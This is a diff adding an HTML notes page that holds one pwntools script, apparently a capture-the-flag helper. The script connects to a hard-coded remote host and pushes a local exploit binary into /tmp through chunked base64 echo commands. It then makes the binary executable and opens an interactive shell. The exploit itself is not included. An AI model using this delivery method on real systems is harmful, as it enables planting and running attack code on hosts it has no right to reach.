@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Untitled</title>
+    <link rel="stylesheet" href="/assets/css/notes.min.css">
+</head>
+<body>
+    <div class="main-content-wrapper">
+        <main class="content">
+            <pre><code class="language-python">from pwn import *
+#context(log_level='debug')
+#io = process(&quot;./boot.sh&quot;)
+io = remote(&quot;183.129.189.60&quot;,10015)
+
+def exec_cmd(cmd):
+    io.sendline(cmd)
+    io.recvuntil(&quot;$ &quot;)
+
+def upload():
+    p = log.progress(&quot;Upload&quot;)
+    with open(&quot;./exp&quot;, &quot;rb&quot;) as f:
+        data = f.read()
+    encoded = base64.b64encode(data)
+    io.recvuntil(&quot;$ &quot;)
+
+    for i in range(0, len(encoded), 600):
+        p.status(&quot;%d / %d&quot; % (i, len(encoded)))
+        exec_cmd(&quot;echo \&quot;%s\&quot; &gt;&gt; /tmp/benc&quot; % (encoded[i:i+600]))
+
+    exec_cmd(&quot;cat /tmp/benc | base64 -d &gt; /tmp/bout&quot;)
+    exec_cmd(&quot;chmod +x /tmp/bout&quot;)
+
+upload()
+io.interactive()
+</code></pre>
+
+        </main>
+    </div>
+</body>
+</html>
